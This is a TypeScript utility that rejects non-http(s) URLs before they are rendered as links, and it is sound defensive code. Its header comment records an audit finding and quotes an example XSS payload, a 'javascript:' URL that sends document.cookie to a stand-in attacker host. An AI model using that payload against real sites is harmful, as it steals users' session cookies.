// =============================================================================
// safeUrl — scheme gate for URLs before they reach an href/src sink.
// =============================================================================
// AUDIT (frontend M1): job postings are scraped from external sites, and their
// `url` field was rendered directly as <a href>. A malicious posting with
// url: "javascript:fetch('//evil/'+document.cookie)" executed in the user's
// dashboard session on click. React does NOT sanitize href values — the scheme
// gate has to happen before rendering.
//
// The rule is deliberately minimal: absolute http(s) URLs only. Relative URLs,
// protocol-relative (//host), and every other scheme (javascript:, data:,
// vbscript:, file:) are rejected by returning null — callers then render the
// plain label instead of a link. URL() parsing also normalizes the usual
// bypass tricks (leading whitespace/control chars, uppercase scheme).
// =============================================================================

/**
 * Return the URL string iff it parses as an absolute http(s) URL, else null.
 * The returned string is the parsed/normalized href — render THAT, not the
 * original input.
 */
export function safeHttpUrl(raw: string | null | undefined): string | null {
  if (typeof raw !== "string" || raw.length === 0) return null
  try {
    const url = new URL(raw)
    return url.protocol === "http:" || url.protocol === "https:"
      ? url.href
      : null
  } catch {
    return null
  }
}
